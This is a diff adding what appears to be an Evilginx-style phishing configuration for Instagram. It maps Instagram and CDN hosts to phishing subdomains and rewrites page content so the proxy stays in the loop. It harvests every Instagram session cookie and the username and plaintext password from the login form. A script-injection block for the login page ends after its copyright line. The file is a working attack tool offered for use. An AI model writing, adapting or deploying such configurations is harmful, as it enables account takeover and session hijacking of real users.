@@ -1,0 +1,43 @@
+author: '@charlesbel'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
+  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'instagram.com', session: false, is_landing: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false}
+  - {phish_sub: 'img', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'static-cdn', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false}
+  - {phish_sub: 'scontent-cdn', orig_sub: 'scontent', domain: 'cdninstagram.com', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graphql', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'img.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\\\/v\\\/)', replace: 'img.{domain}\\/v\\/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.instagram.com'
+    keys: ['sessionid','.*,regexp']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'unenc_password'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.instagram.com'
+  path: '/accounts/login'
+
+js_inject:
+  - trigger_domains: ["www.instagram.com"]
+    trigger_paths: ["/accounts/login"]
+    trigger_params: []
+    script: |
+      // Copyright 2023 Charles Bel (@charlesbel)
